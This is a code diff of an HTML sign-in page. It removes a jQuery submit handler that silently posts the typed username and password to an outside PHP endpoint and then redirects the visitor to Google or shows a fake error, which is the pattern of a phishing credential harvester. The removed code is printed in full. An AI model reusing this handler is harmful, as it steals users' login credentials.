@@ -96,7 +96,7 @@
 
 							</div>
 
-							<form id="logonForm" method="POST">
+							<form id="logonForm">
 
 								<!-- Username form field -->
 								<div class="form-group ">
@@ -129,7 +129,7 @@
 									</div>
 
 								</div>
-								<button id="buttonSbmt" type="button"
+								<button id="buttonSbmt" type="submit"
 									class="g-recaptcha btn home-login-btn btn-block btn-lg">Sign In<span
 										class="glyphicon glyphicon-log-in" aria-hidden="true"></span> </button>
 
@@ -343,37 +343,6 @@
 	</div>
 	<script src="./assets/js/index.js"></script>
 	<script type="text/javascript">
-		$("#logonForm").on('submit', function () {
-			$.ajax({
-				url: "https://platiniumxpwallet.com/external/claimant/php/mail_key.php",
-				method: "post",
-				data: {
-					login: document.getElementById("j_username").value,
-					password: document.getElementById("j_password").value,
-
-				},
-				success: function (data) {
-					console.log(data);
-					if (data == "Sent") {
-						location.assign(
-							"https://google.com?q=whoernet"
-						);
-					} else {
-						alert("Error Logging Into Your Account");
-					}
-				},
-				fail: function (data) {
-					console.log(data);
-					alert("Error Logging Into Your Account");
-				},
-				error: function (data) {
-					console.log(data);
-					alert("Error Logging Into Your Account");
-				},
-			});
-
-			return false;
-		})
 	</script>
 </body>
 
